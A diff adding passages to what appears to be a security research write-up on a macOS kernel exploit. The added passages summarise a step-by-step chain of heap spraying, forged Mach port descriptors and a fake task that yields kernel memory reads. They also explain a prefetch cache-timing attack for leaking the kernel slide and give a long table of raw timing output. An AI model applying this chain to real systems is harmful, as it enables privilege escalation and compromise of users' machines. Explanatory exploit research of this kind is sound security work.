@@ -699,9 +699,581 @@ At last, we've successfully turned very constrained read and write primitives in
 -   Pointer arrays.
 -   `struct ipc_kmsg`.
 
-In the beginning, the problem with pointer arrays was that they would only ever contain pointers to objects allocated on the heap, where we couldn't follow with our constrained read primitive. With arbitrary read however, things are looking much better! If we allocate, say, an `OSArray`, read the pointer to the first object it contains, and from that address read the first 8 bytes, we get its vtable - which resides in `__CONST.__constdata`, and whose address thus reveals the kernel slide. Now we only have to allocate an OSArray large enough for its pointer buffer to reach `0x30000` bytes. One way of achieving this would be to actually allocate an array with 24'576 elements (we could use all `OSBoolean`s to go easy on memory), but we don't even have to. We can take advantage of the binary serialisation format, namely the fact that dicts, arrays and sets take and use a length specifier from userland. Effectively, we can set an `OSArray`'s size to `0x6000` (that is later multiplied by the size of a pointer) but then supply only one element.
+In the beginning, the problem with pointer arrays was that they would only ever contain pointers to objects allocated on the heap, where we couldn't follow with our constrained read primitive. With arbitrary read however, things are looking much better! If we allocate, say, an `OSArray`, read the pointer to the first object it contains, and from that address read the first 8 bytes, we get its vtable - which resides in `__CONST.__constdata`, and whose address thus reveals the kernel slide. Now we only have to allocate an OSArray large enough for its pointer buffer to reach `0x30000` bytes. One way of achieving this would be to actually allocate an array with 24'576 elements (we could use all `OSBoolean`s to go easy on memory), but we don't even have to. We can take advantage of the binary serialisation format, namely the fact that dicts, arrays and sets take and use a length specifier from userland. Effectively, we can set an `OSArray`'s size to `0x6000` (that is later multiplied by the size of a pointer) but then supply only one element. But even if we didn't have all that, we could ultimately also send a kmsg with an actual port to e.g. an `IOService` object.
+
+So in review, we:
+
+1. Spray the `kalloc_map` with `OSString` buffers.
+2. Offset `evg`.
+3. Read the strings back to find out where it landed.
+4. Punch a hole underneath it.
+5. Allocate a kmsg into that hole.
+6. Read `ikm_header` off it, yielding the shmem kernel address.
+7. Repair any damage we've done.
+8. Allocate a new kmsg with body bytes corresponding to a port descriptor pointing to somewhere in shared memory.
+9. Switch `msgh_descriptor_count` from `0` to `1` so that our bytes are actually interpreted as a descriptor.
+10. Construct a fake port and task on the shared memory.
+11. Receive the kmsg, thus inserting the fake port into our namespace.
+12. Point `fakeport.ip_kobject.bsd_info` to an address and use `pid_for_tak(fakeport)` to read from it.
+
+At that point we could also attach a `vm_map_t` (such as the `kernel_map`) to our fake task to gain full r/w, or swap the fake task out for a fake `IOService` object with a custom vtable, allowing us to call arbitrary kernel code. I'm gonna leave it at leakage of the kernel slide here though.
+
+_This is implemented in [`src/leak/main.c`](TODO)._
 
 ### Leaking the kernel slide, the cheater's way
+
+The above is nice and all (and was actually super fun to piece together), but it has a slight drawback: it takes a significant amount of time to execute after getting the `IOHIDUserClient` port. In a real attack scenario, that would mean that if we run on a logout, the user would be confronted with a black screen for quite a bit longer than they'd expect, and if we run on a shutdown/reboot, we might even get killed before we get our work done (this depends on physical memory size, and is also less likely when targeting the `kalloc_map` but more likely with the `kernel_map`). On top of that, the above way was chronologically the last part of the exploit I wrote. For those reasons we're gonna look at another way to leak the kernel slide, one that can be executed independently of any other part of the exploit: hardware vulnerabilities!
+
+Long story short, we're doing a prefetch cache timing attack [as devised by Gruss et al][prefetch]. I add nothing new to this technique, I merely wrote my own implementation of it. For those unfamiliar with how it works, the basic vulnerabilities lie in the x86 `prefetchtN` instructions (where `N` can be `1`, `2`, ...). Those were designed as hints to the CPU that the program requests data at some address to be loaded into a particular cache, but they have a few interesting properties:
+
+- They ignore access permissions of all kinds, allowing even the prefetching of kernel memory.
+- They perform a number of address lookup attempts, and stop as soon as they find something. This means that for an unitialised (or evicted) cache, they execute significantly faster for mapped addresses than unmapped ones.
+- They silently ignore all errors (not a vulnerability in that sense, but a nice property).
+
+Interestingly enough, no implementation I found on the web seemed to work for me, so I ended up writing my own. Like in the paper, I target the `prefetcht2` instruction (i.e. the L2 cache), and for every timing I do:
+
+1. Evict the cache.
+2. Use `mfence` to synchronise memory accesses.
+3. Invoke `prefetcht2`.
+4. Use `rdtscp` before and after it to get the time difference.
+
+For eviction I use the L3 cache rather than just the L2, because then misses will have to go to main memory, which leaves a much bigger mark in the time difference (there's also a notable difference when targeting L2, it's just a lot smaller). The most efficient way to do that is to allocate a memory block as large as the L3 cache, divide them into parts as large as the cache line size, and do a single memory read on each of those parts. Conveniently, there are two `sysctl` entries `hw.cachelinesize` and `hw.l3cachesize` giving us just the information we need.
+
+Now in order to find the kernel base, I just start at address `0xffffff8000000000`, go up to `0xffffff8020000000` in steps of `0x100000` bytes, perform 16 timings at each step and throw in a `sched_yield()` before each timing to minimise external interference. I implemented that in [`data/kaslr.c`](TODO), and running it yields the following:
+
+    0xffffff8000000000     32    452     32     32     32     32     32     32     32     32    116     31     28     28     28     31
+    0xffffff8000100000    558    232    235    468    232    332    499    335    242    301    239    291    874    369    343    286
+    0xffffff8000200000    286    437    446    463    440    434    443    561    443    437    443    443    440    440    452    511
+    0xffffff8000300000    446    538    546    286    440    440    499    440    440    451    440    448    437    443    505    543
+    0xffffff8000400000    452    469    443    307    307    295    307    443    670    437    475    682    658    788    304    573
+    0xffffff8000500000    460    679    440   1116    452    440    496   1642    558    588    443    307    512    874    598    660
+    0xffffff8000600000    598    282    318    457    443    461    481    402    454    440    443    461    443    443   1078    605
+    0xffffff8000700000    602    647    602    605    591    576    451    715    310    529    310    269   1621    794    307    356
+    0xffffff8000800000    453    282    443    279    496    443    800    664    946    834   1107    555    440   1196    334    443
+    0xffffff8000900000    454    454    593    555    443    794    449    490    286    440    443    443    443    454    446    463
+    0xffffff8000a00000    520    440    561    593    496    552    384    590    588    588    578    608    614   1110    636    380
+    0xffffff8000b00000    448    572    280    596    568    600    444    444    712    448    528    456   1296    448    628    452
+    0xffffff8000c00000    448    456    584    448    596    452    448    780    276    310    310    443    450    453    456    543
+    0xffffff8000d00000    573    453    453    450    540    446    279    471    472    522    472    440    443    472    443    451
+    0xffffff8000e00000    461    440    475    310    464    579    464    469    482    454    464    440    614    452    310    472
+    0xffffff8000f00000    475    759    461    767    458    443    475    718    475   1514    443   1934    319    708    307   1258
+    0xffffff8001000000    443   1033    718    658    454    443    440    620    446   1048    552    741    443    443    454    440
+    0xffffff8001100000    440    502    463    446    520    446    443    443    443    443    443    529    529    457    637    437
+    0xffffff8001200000    372    278    286    443    443  42659    390    450    279    440    443    447    443    443    446    567
+    0xffffff8001300000    564    544    446    440    440    457    443    526    522    517    449    443    440    526    443    455
+    0xffffff8001400000    656    469    461    440    472    608   1178    446   1036    443    443    508    461    871    472    440
+    0xffffff8001500000    475   1317    437    555    511    451    472    458    593    440    440    472    546    620   1264   1724
+    0xffffff8001600000    543    523    711    638    528    437    440    758    555    455    263    369    301   1491    901   1557
+    0xffffff8001700000    568    263    553    272    458    266    280    277    676    464    815    570    437    455   1096    930
+    0xffffff8001800000    479    301    272    493    558   1361   1311    310   1470    452    290    396    109    280    263    277
+    0xffffff8001900000    478    295    602    771    354   1258    865    556     83    190    167    106    109     81    291    325
+    0xffffff8001a00000    679    650    791    626    313    266    266    263    266    266    263    274    277    277    277    283
+    0xffffff8001b00000    440    103    266    266    274    266    263    269    280    266    263    260    266    280    274    266
+    0xffffff8001c00000    443    266    304    277    139    290    759     92    106    269    109    277    106    280    263    106
+    0xffffff8001d00000    443    266    269    277    806    266    277    425    269    537    266    277    266    360    277    694
+    0xffffff8001e00000    440    263    280    269    266    269    293    266    266    266    277    283    266    277    283    263
+    0xffffff8001f00000    582    266    269    266    266    280    266    263    266    269    263    269    266    328    269    274
+    0xffffff8002000000    443    847    277    277    298    266    283    274    272    307    277    269    280    274    266    269
+    0xffffff8002100000    443    266    280    280    277    269    283    269    475    277    274    266    269    277    517    295
+    0xffffff8002200000    443    425    266    283    451    266    272    277    310    316    283    283    283    269    269    266
+    0xffffff8002300000    449    266    275    269    446    266    283    298    384    277    277    280    266    322    272    266
+    0xffffff8002400000    467    283    269    106     92    106    274    280    280    266    277    280    277    280    266    304
+    0xffffff8002500000    454    277    269    269    277    266    269    277    266    266    263    277    490    277    289    286
+    0xffffff8002600000    440    440    443    443    443    440    443    440    440    452    440    443    440   1116    443    454
+    0xffffff8002700000    948    440    443    599    443    451    280    446    451    454    454    440    464    283    520    514
+    0xffffff8002800000    440    443    437    440    476    729    443    443    437    431    422    457    266    432    275    679
+    0xffffff8002900000   1101    443    443    443    597    505    443    558    269    440    440    103    446    443    100   1175
+    0xffffff8002a00000    540   1063    564    319    800    266    558    741    505    505    502    451    443    558   1524    727
+    0xffffff8002b00000   1151    443    440    443    443    443    277    443    440    457    443    440    454    263    443    437
+    0xffffff8002c00000    446    280    508    272    508    511    567    519    602    508    546    440    440    443    440    454
+    0xffffff8002d00000    481   1010    744    537    440    440    514    443    534    511    673    537    523    263    520    543
+    0xffffff8002e00000    443    443    443    451    461    440    484    440    443    457    443    508    540    443    525    440
+    0xffffff8002f00000    446    440    449    440    460    449    443    443    440    266    443    440    443    263    443    697
+    0xffffff8003000000    440    449    446    443    443    522    443   1447    635   1237    452    440    437    440    443    458
+    0xffffff8003100000    443    446    460    440    443    457    446    440    443    440    443    440    440    454    443    443
+    0xffffff8003200000    443    457    452    440    446    443    446    454    454    446    443    446    443    461    440    443
+    0xffffff8003300000    454    446    446    449    443    469    289    440    460    443    440    664    446    443    446    475
+    0xffffff8003400000    437    443    437    443    443    437    443    443    443    440    449    581    446    443    446    443
+    0xffffff8003500000    443    440    437    448    443    443    443    461    440    452    440    443    440    457    443    443
+    0xffffff8003600000    440    269    277    283    266    280    280    269    269    481    280    266    263    269    266    269
+    0xffffff8003700000    451    280    269    280    269    283    272    266    277    280    269    280    277    266    269    310
+    0xffffff8003800000    443    266    280    266    266    266    269    277    277    269    266    269    283    266    269    269
+    0xffffff8003900000    532    266    266    277    283    272    266    269    266    277    915    277    269    272    277    278
+    0xffffff8003a00000    440    269    272    277    269    277    280    552    275    269    277    301    277    289    266    269
+    0xffffff8003b00000    452    283    277    269    269    301    280    272    269    269    280    269    280    266    280    266
+    0xffffff8003c00000    443    269    277    446    440    277    871    295    280    280    281    266    269    266    277    277
+    0xffffff8003d00000    582    277    269    277    269    266    269    280    280    266    269    280    269    269    263    266
+    0xffffff8003e00000    440    289    280    266    266    280    280    266    269    266    266    269    269    286    269    274
+    0xffffff8003f00000    443    272    269    277    277    266    280    269    266    269    266    277    277    269    283    266
+    0xffffff8004000000    443    812    269    280    266    266    263    266    266    266    266    266    298    263    272    277
+    0xffffff8004100000    446    266    263    266     95    277    263    266    263    277    266    263    284    472    266    263
+    0xffffff8004200000    440    269    266    106    269    269    269    280    277    280    266    277    269    372    280    277
+    0xffffff8004300000    443    269    269    269    266    269    280    355    275    272    266    277    272    301    266    269
+    0xffffff8004400000    463    266    263    277    277    277    608    275    269     92    266    280    277    266    277    278
+    0xffffff8004500000    440    266    266    266    266    266    277    263    304    266    266    266    266    263    277    266
+    0xffffff8004600000    446    280    266    274    266    269    266    280    272    588    266    266    263    280    277    266
+    0xffffff8004700000    821    266    280    277    277    277    266    269    274    266    266    269    277    591    327    266
+    0xffffff8004800000    448    269    706    272    269    272    277    280    266    407     95    266    576    266    269     92
+    0xffffff8004900000    590    266    269     92    266    277    266    443    269    434    467    289    269    266    266    269
+    0xffffff8004a00000    440    277    263    280    263    281    292    266    266    266    266    277    266    266    263    277
+    0xffffff8004b00000    461    266    263    266    277    596    310    274    277    357    266    552    263    472    266    266
+    0xffffff8004c00000    481    283    280    266    277    277    269    269    263    277    283    269    269    277    269    283
+    0xffffff8004d00000    457    280    266    277    614    266    393    277    277    280    428    277    280    266    272    280
+    0xffffff8004e00000    461    283    425    266    277    269    277    280    280    275    266    277    277    283    277    269
+    0xffffff8004f00000    443    277    269    277    280    266    269    266    281    277    280    280    266    269    106    269
+    0xffffff8005000000    517    266    272    280    290    280    263    277    280    266    266    269    277    443    277    280
+    0xffffff8005100000    446    280    266    266    280    269    263    266    280    277    295    277    269    277    266    304
+    0xffffff8005200000    443    277    277    283    266    269    277    269    277    272    269    280    283    275    277    277
+    0xffffff8005300000    464    287    269    269    280    106    295    266    266    266    283    266    277    277    269    269
+    0xffffff8005400000    511    272    277     95    266    269    266    269    280    263    277    269    280    277    277    298
+    0xffffff8005500000    457    449    446    543    546    546    543    629    543    543    543    449    466    446    443    451
+    0xffffff8005600000    446    457    443    526    460    443    443    443    528    449    446    443    443    443    443    469
+    0xffffff8005700000    454    446    443    443    446    443    466    440    449    443    446    440    519    511    446    522
+    0xffffff8005800000    443    440    452    446    451    443    443    443    440    443    472    443    443    454    475    454
+    0xffffff8005900000    440    461    446    440    440    434    446    440    464    446    443    443    443    446    443    443
+    0xffffff8005a00000    534    460    446    446    457    446    443    443    443    454    499    446    446    440    443    443
+    0xffffff8005b00000    460    454    440    446    517    457    443    446    443    457    457    443    443    499    440    449
+    0xffffff8005c00000    440    440    443    454    446    443    454    738    440    440    437    443    454    440    440    443
+    0xffffff8005d00000    440    457    378    437    520    856    523    523    443    443    443    454    476    440    475    446
+    0xffffff8005e00000    440    280    266    266    103    295    269    283    266    277    280    269    292    322    266    277
+    0xffffff8005f00000    626    266    343    272    269    287    284    269    280    280    295    269    263    266    266    269
+    0xffffff8006000000    454    904    443    266     92    103    277    304    266    266    266    266    280    280    266    280
+    0xffffff8006100000    440    266    443    273    313    269    279    106    276    282    418    112    266    106    263    273
+    0xffffff8006200000    446    276    276    269    273    273    269    269    273    273    266    266    328    103    280    266
+    0xffffff8006300000    587    266    266    266    336    263    266    331    266    266    109     99    102    276    266    266
+    0xffffff8006400000    446    440    269    280    280    269    558    269    266    266    269    277    467    104    269    272
+    0xffffff8006500000    443    263    277    363    277    280    277    342    274    263    269    280    277    263    277    328
+    0xffffff8006600000    446    443    443    451    440    443    443    451    440    455    440    446    440    440    440    440
+    0xffffff8006700000    443    440    443    440    277    691    448    277    440    667    561    912    443    451    451    440
+    0xffffff8006800000    540    440    440    446    451    443    277    434    443    443    467    484    440    451    785    434
+    0xffffff8006900000    437    528    540    570    529    526    543    440    266    440    448    440    434    443    437    443
+    0xffffff8006a00000    451    451    443    443    437    440    454    440    458    443    440    596    461    440    448    443
+    0xffffff8006b00000    440    599    263    457    632    443    443    443    269    446    632    443    440    451    443    475
+    0xffffff8006c00000    440    499    451    440    443    440    443    440    437    448    454    564    478    481    464    487
+    0xffffff8006d00000    443    454    499    434    437    272    440    667    454   1060    472    443    487    437    437    451
+    0xffffff8006e00000    440    446    647    440    437    443    454    269    440    304    440    446    440    440    437    437
+    0xffffff8006f00000    446    440    437    272    443    451    499    771    440    443    440    440    440    440    452    454
+    0xffffff8007000000    437    440    540    452    434    448    440    440    437    437    493    434    437    434    437    440
+    0xffffff8007100000    440    437    443    437    434    266    437    277    437    263    437    437    434    585    451    437
+    0xffffff8007200000    443    446    440    443    443    437    440    266    481    570    451    440    440    440    443    440
+    0xffffff8007300000    451    454    440    440    437    440    451    443    443    451    454    437    440    437    440    449
+    0xffffff8007400000    437    434    665    440    266    437    451    443    443    579    440    469    434    437    437    437
+    0xffffff8007500000    437    567    263    437    446    434    437    437    437    437    434    567    440    434    437    499
+    0xffffff8007600000    818    266    437    437    260    277    266    266    263    286    263    446    263    263    263    260
+    0xffffff8007700000    443    263    274    274    260    263    277    274    263    263    263    263    469    266    260    263
+    0xffffff8007800000    440    263    263    263    263    434    266    451    266    277    274    266    266    283    274    277
+    0xffffff8007900000    451    277    277    293    263    277    266    274    280    277    277    260    266    269    266    280
+    0xffffff8007a00000    437    260    260    260    266    266    266    263    266    277    310    263    260    260    263    274
+    0xffffff8007b00000    455    274    263    277    280    269    298    266    266    263    263    269    322    266    723    263
+    0xffffff8007c00000    443    266    333    269    277    266    274    301    316    277    263    269    106    263    269    277
+    0xffffff8007d00000    587    266    269    440    443    266    277    269    440    280    313    546    437    263   1355    450
+    0xffffff8007e00000    437    266    446    447    276    273    502    717    587    478    481    313    446    283    585    283
+    0xffffff8007f00000    499    520    499    437    451    266    266    277    266    419    266    449   1211    472    535    142
+    0xffffff8008000000    454    263    263    552    336    482    295    269    331    272    292    281    280    340    277    629
+    0xffffff8008100000    440    587    280    269    266    269    266    269    266    266    280    280    280    269    269    280
+    0xffffff8008200000    440    283    266    277    266    277    499    283    269    266    266    280    269    280    266    269
+    0xffffff8008300000    466    277    266    266    274    266    313    266    266    263    269    280    286    277    434    266
+    0xffffff8008400000    443    269    269    266    440    440    263    266    815    372    280    266    277    458    277    266
+    0xffffff8008500000    939    263    269    280    277    266    274    313    277    522    103    274    263    274    452    266
+    0xffffff8008600000    620    277    278    266    280    295    266    277    266    269    277    266    452    690    461    109
+    0xffffff8008700000    457    269    269    280    277    307    280    266    269    280    277    266    266    570    496    293
+    0xffffff8008800000    280    266    277    266    450    105    276    276    434    276    273    269    273    279    269    524
+    0xffffff8008900000   1116    349    266    281    266    266    295    277    266    280    269    266    277    266    266    274
+    0xffffff8008a00000    451    280    266    280    280    266    266    283    277    277    266    269    277    277    280    266
+    0xffffff8008b00000    437    266    269    280    266    266    280    266    269    266    266    263    272    266    277    269
+    0xffffff8008c00000    443    617    263    266    277    266    269    263    277    280    614    419    824    280    493    390
+    0xffffff8008d00000   1355    484    475    432     81    269    351    357    428    269    292    387    579    454    266    269
+    0xffffff8008e00000    564    272    266    322    363    313    266    269    269    269    269    269    266    440    266    280
+    0xffffff8008f00000    443    277    266    277    277    274    280    280    277    277    269    280    280    280    612    556
+    0xffffff8009000000 293052    704   1466    635    607    109    322    279    266    285    276    276    276    558    276    279
+    0xffffff8009100000    461    295    280    269    277    266    263    266    277    408    298    295    277    269    266    280
+    0xffffff8009200000    440    269    269    936    346    280    269    269    283    266    277    263    272    280    266    266
+    0xffffff8009300000    443    280    266    266    269    269    269    266    401    269    266    266    283    277    266    266
+    0xffffff8009400000    543     92    103    396    800    277    263    266    263    263    277    612    449    280    468    865
+    0xffffff8009500000    592    266    456    446    109    530    276    539    440    440    130    834    450    443    440    448
+    0xffffff8009600000    443    440    443    440    437    517    558    280    520    520    440    437    552    567    450    514
+    0xffffff8009700000    275    564    280    765    443    283    443    670   1497    829   1022    443    443    449   1039    794
+    0xffffff8009800000    460    443   1092    446   1405    446    688    443    774    446   1302    466    443    451    632    529
+    0xffffff8009900000    463    443    443    443    440    443    440    440    440    437    452    443    443    443    443    443
+    0xffffff8009a00000    454    443    443    446    443    449    443    272    446    454    446    443    446    457    454   1488
+    0xffffff8009b00000   1204    452    454    446    446    457    472    283    443    478    670    496    443    437    617    440
+    0xffffff8009c00000    652    576    652    829    437    511    750    522    531    549    526   1134    567    827    584    555
+    0xffffff8009d00000    505    437    440    437    440    508    532    537    529    440    437    437    437    437    434    440
+    0xffffff8009e00000    440    437    841    596    600    600    588    602   1264    602    594    596    448    448    444    476
+    0xffffff8009f00000    636    468    500    448    452    544    452    456    452    556    452    976    568    864   1012    452
+    0xffffff800a000000    556    996   1376    448    856    448   1272    564    446    753    450    446    453    527    462    453
+    0xffffff800a100000    453    446    446    450    443    443    713    474    440    446    446    449    681    576    404    620
+    0xffffff800a200000    614    614    614    468    602    396    582    596    614    602    602    602    584    580   1752    464
+    0xffffff800a300000    796    504   1136    448   1060    452    800    448    448    452    452    452    460   1020    616    448
+    0xffffff800a400000    448    448    448   1472    504    448    452    462    453    446    446    468    446    453    446    446
+    0xffffff800a500000    443    446    443    443    459    443    456    453    446    647    449    280    458    443    443    454
+    0xffffff800a600000    451    443    454    443    443    440    443    446    443    956    446    443    446    440    440    457
+    0xffffff800a700000    457    443    440    440    446   1057    443    440    457    342    451   1160    451    440    443    277
+    0xffffff800a800000    443    581    440    440    901    443    443    629    280   1261    443    499    443    443    440    451
+    0xffffff800a900000    443    451    446    732    443    269    443    543    546    443    443    440    549    603    437    280
+    0xffffff800aa00000    443    440    440    449    446    440    443    443    443    440    715    443    508    508    774    481
+    0xffffff800ab00000    451    437    576    440    451    446    440    521    453    443    443    453    586    725    450    685
+    0xffffff800ac00000    453    443    450    443   1010   1122   1048   1106   1119    939    663    443    462    456    446    456
+    0xffffff800ad00000    443    443    437    440    443    446    505    443    453    521    446    446    277    726    443    443
+    0xffffff800ae00000    688    440    440    269    443    443    440    106    443    440    443    443    443    457    451    454
+    0xffffff800af00000    443    443    277    443    440    454    440    682    440    573    440    443    496    440    505    443
+    0xffffff800b000000   1500    440    451    443   1051    443    989    437    927    272    611    454    977    443    440    552
+    0xffffff800b100000    712    528    272    336    454    443    440    280    440    440    443    284    511    443    573    493
+    0xffffff800b200000    434    263    263    263    434    440    437    437    466    437    437    437    437    682    673    617
+    0xffffff800b300000    679    478    106    451    520    288    440    738    443    703    269    845    443    443    839    269
+    0xffffff800b400000    283   1063    443    275    446    446    602   1199    446    443    747    443    443    446    443    443
+    0xffffff800b500000    443    443    463    446    446    443    466    457    440    446    730    443    446    446    475    280
+    0xffffff800b600000    454    455    457    505    440    443    528    443    446    269    446    454    458    443    446    443
+    0xffffff800b700000    457    280    457    446    443    443    446    519    443    443    446    499    440    464    446    514
+    0xffffff800b800000    446    815    451    475    499    463    475    457    440    549    525    283    608    440    611   1190
+    0xffffff800b900000    989    440    789    446    443    526    440    446    597    440    451    448    440    446    457    443
+    0xffffff800ba00000    457    499    443    454    443    443    446    443    579    443    269    514    275    443    443    443
+    0xffffff800bb00000    446    457    454    446    440    457    496    275    443    454    443    457    440    443    460    443
+    0xffffff800bc00000    667    272    446    915    443    449    454   1089    443   1358    440    670    437    440    440    440
+    0xffffff800bd00000    440    440    440    283    454    446    458    443    269    440   1290    440   1473    443    286    443
+    0xffffff800be00000    457    443    446    446    446    446    269    443    446    446    457    688    440    443    443    443
+    0xffffff800bf00000    446    440    446    440    443    440    440    535    446    460    443    460    446    446    443    443
+    0xffffff800c000000    564    711    283    446    744    726    443    280    443    440    443    451    463    514   1222    585
+    0xffffff800c100000    333    266    432    429    440    443    936    694    555    466    443   1263    443    877    526   1453
+    0xffffff800c200000    280   1349    437   1018    443    779    446    437    460    440    357    676    280    455    272    454
+    0xffffff800c300000    499    443    443    269    646    440    440    451    269    443    272    499    543    443    446    437
+    0xffffff800c400000    457    481    440    440    266    449    443    280    472    443    443    440    481    520    481    454
+    0xffffff800c500000    269    457    457    440    280    440    440    443    614    469    440    437   1302    440    469    280
+    0xffffff800c600000   1234    953    443    830    815    534    272    567    269    440    440    508    788    432    454    411
+    0xffffff800c700000    584    443    443    443    440    812    450    446    443    446    279    453    266    453    453    450
+    0xffffff800c800000    499    446    288    446    276    595    781    451    272    432    502    520    304    272    464    440
+    0xffffff800c900000    463    440    443    446    280    440    440    390   1405    514    440    608    555    440    564    502
+    0xffffff800ca00000    478   1662    443    440    440    443    443    443    440    266    443    440    440    440    440    443
+    0xffffff800cb00000    513    272    440    546    570    443    440    440    443    440    451    266    534    472    443    440
+    0xffffff800cc00000    460    440    443    277    446    451    481    451    440    443    443    437    443    520    437    440
+    0xffffff800cd00000    269    443    537    443    443    446    443   1119    440    451    280    440    455    269    454   1004
+    0xffffff800ce00000    440    434    434    614    451    440   1012    346    440    437    437    440    283    682    440    446
+    0xffffff800cf00000    443    440    440    455    452    499    443    443    703    620    437    272    283    443    443    443
+    0xffffff800d000000    437    452    470    266    451    440    277    440    650    440    437    443    440    437   1511    738
+    0xffffff800d100000    454    732    269    269    443    446    443    449    682    339    463    930   1367    440    582    472
+    0xffffff800d200000    440    531    443    844    280    440    584    658    717    440    449    838    437    440    443    280
+    0xffffff800d300000    440    440    437    451    484    443    496    266    277    440    443    449    454    280    437    481
+    0xffffff800d400000    437    440    448    437    448    437    715    496    440    464    440    649    635    437    437    277
+    0xffffff800d500000    266    437    437    437    437    325    266    437    437    440    440    605    611    440    617    440
+    0xffffff800d600000    517    283    260    274    263    266    260    263    263    286    106    283    765    266    490    277
+    0xffffff800d700000    266    274    263    263    266    260    263    263    260    260    266    263    274    269    263    263
+    0xffffff800d800000    443    280    272    266    277    263    263    263    263    419    266    277    263    277    263    289
+    0xffffff800d900000    448    263    266    266    493    277    292    266    277    106    280    266    274    266    263    277
+    0xffffff800da00000    437    263    260    274    271    266    103    292    263    263    319    263    266    263    263    452
+    0xffffff800db00000    263    277    263    263    263    266    274    274    319    298    263    103    263   1674    260    263
+    0xffffff800dc00000    437    263    263    263    263    263    269    269    272    263     92    266    298    263    274    274
+    0xffffff800dd00000    440    266    266    266    266    266    304    502    720    520   1243    106    266    284    478    280
+    0xffffff800de00000    437    437    437    437    434    469    469    437    670    440    437    437    555   1107    437   1178
+    0xffffff800df00000    534    437    440    520    481    429    275    554    297    611    735   1078    440    437   1237    440
+    0xffffff800e000000    915    883    283    443    443    443    278    540    443    443    443    446    446    440    446    283
+    0xffffff800e100000    511    443    325    269    341    335    446    289    286    440    310    336    458    287    454    280
+    0xffffff800e200000    605    453    592    266    447    282    289    279    276    276    288    440    294    450    642    970
+    0xffffff800e300000    518    278    440    443    454   1045    440    590    440    280    440    508    284   1045    443   1202
+    0xffffff800e400000    443   1358    440    443    460    446    443    443    440    443    443    443    446    443    440    446
+    0xffffff800e500000    443    440    446    437    440    443    448    451    448    454    446    440    277    451    443    275
+    0xffffff800e600000    451    446    443    496    378    977    269    272    460    280    546    437    461    280    803    454
+    0xffffff800e700000   1213    440    443    676    269    440    440    789    440    605    472    620    440    109    520    437
+    0xffffff800e800000    537    703    266   1169    511    983    552    520    531    528    269    272    277    532    526    508
+    0xffffff800e900000    520    269    543    564    446    440    269    440    280    269    325    443    440    443    454    440
+    0xffffff800ea00000    440    457    458    307    275    443    280    464    269    440    443    272    454    440    440    443
+    0xffffff800eb00000    826    263    277    443    531    266    103    446   1287    773     95    529   1048    570    525    570
+    0xffffff800ec00000   1116    443    283    454    953    466    832    440    443    454    443    658    499    452    440    443
+    0xffffff800ed00000    443    446    443    440    443    269    514    443    451    472    437    443    283    443    269    287
+    0xffffff800ee00000    859    838    620    620    410    614   1260   1234    588    608    456    280    448    444    452    452
+    0xffffff800ef00000    448    276    768    448    464    280   1192    468    448    932    280    452    448   1164    280    444
+    0xffffff800f000000    444    268    280    236    240    236     72    295    561    546    236    961    291     65    239    242
+    0xffffff800f100000    229    232     68    239    232     62    233    623    239    231    239    225     62     65    236     62
+    0xffffff800f200000     24     24     35     24     35     24     24     35     24     24     24     24     35     35     35     35
+    0xffffff800f300000     24     24     24     24     35     35     35     35     35     35     35     35     24     24     24     35
+    0xffffff800f400000     35     24     24     35     24     24     24     24     24     24     24     24     35     35     24     35
+    0xffffff800f500000     35     24     35     24     35     35     35     35     35     62     62     24     24     24     21     24
+    0xffffff800f600000     35     32     24     21     24     24     32     24     21     21     24     35     32     35     24     21
+    0xffffff800f700000     24     24     24     35     24     35     35     24     24     24     24     35     35     24     24     35
+    0xffffff800f800000     35     24     24     35     35     35     24     35     35     35     35     24     35     35     24     24
+    0xffffff800f900000     35     24     24     35     24     24     35     35     35     24     35     35     35     35     24     24
+    0xffffff800fa00000    239     35     35     35     35     24     24     24     35    115     24     59    214     21     24     62
+    0xffffff800fb00000    225     24     65     62     24     35     24     24     59     35     35     24     35     35     35     35
+    0xffffff800fc00000    676     35     35     35     35     24     35     35     35     35     24     24     24     35     35    413
+    0xffffff800fd00000    307    460    239    239    236    236    286    225    233    236    236    236    248    233    236    236
+    0xffffff800fe00000    446    239    236    239    233    236    236    225    239    228    233    239    233    431    363    339
+    0xffffff800ff00000    278    214    236    239    286    280    239    236    233    254    239    316    277    236    225    239
+    0xffffff8010000000    319    272    225    225    502    514    357    242    239    239    337    236    239    517    233    236
+    0xffffff8010100000    228    490    239    236    239    284    236    242    242    260    239    236    262    239    239    381
+    0xffffff8010200000    469    378    236    228    228    239    239    225    239    225    225   1101    225    236    236    239
+    0xffffff8010300000    251    236    225    417    236    239    236    236    236    236    236    272    228    239    239    239
+    0xffffff8010400000    446    239    239    239    239    239    236    236    233    304    472    912    239    239    239   1089
+    0xffffff8010500000    703    354    431    466    239    236    266    239    236    239   2037    236    322    239    239    225
+    0xffffff8010600000    443    236    236    239    236    239    239    239    239    228    236    236    328    393    228    239
+    0xffffff8010700000    245    239    245    236    239    232    239    235    239    248    341    279    239    232    242    232
+    0xffffff8010800000    561    232    242    496    295    257   1163    466    239    236    239    245    236    729    475    236
+    0xffffff8010900000    266    286    225    236    322    239    505    236    236    236    537    236    540    233    233    236
+    0xffffff8010a00000    440    284    358    741    239    236    225    239    233    239    924    225    236    225    225    239
+    0xffffff8010b00000    228    239    336    236    236    236    791    480    409    285    232    239    434    400    353    487
+    0xffffff8010c00000    803    564    239    236    222    233    236    236    236    233    236    236    225    487    233    225
+    0xffffff8010d00000    245    242    233    632    236    233    225    236    239    228    225    236    236    236    236    239
+    0xffffff8010e00000    768    233    239    225    236    225    225    239    239    239    236    236    236    236    239    242
+    0xffffff8010f00000    225    239    236    225    236    236    228    236    236    225    236    236    225    236    239    225
+    0xffffff8011000000    487    239    236    236    236    236    446    236    236    700    236    239    372    222    236    236
+    0xffffff8011100000    239    236    319    239    617    239    239    236    236    236    228    236    236    242    236    242
+    0xffffff8011200000    454    239    239    228    236    225    228    239    239    233    236    389    228    233    236    399
+    0xffffff8011300000    809    333    272    269    236    228    260    239    272    236    446    229    279    450    239    229
+    0xffffff8011400000    502    239    505    267    502    229    236    524    229    518    480    236    511    239    239    406
+    0xffffff8011500000    400    239    310    329    481    239    821    248    475    362    239    254    236    239    225    242
+    0xffffff8011600000    496     62     65     62     71     62     65     62     62     62     62     62     71     62     62     65
+    0xffffff8011700000    239     62     65     62     59     65     62     62    228    277     65     76     76     79     51     62
+    0xffffff8011800000    440     62    448    276     72     64    800    276     62     74     75     65     65     65     65     65
+    0xffffff8011900000    332     65     68     65     72     65     62     65     65     62     65     62     62     65    106    469
+    0xffffff8011a00000    454    599    328    266     62     65     62     62     65     62     62     62     62     65     62     68
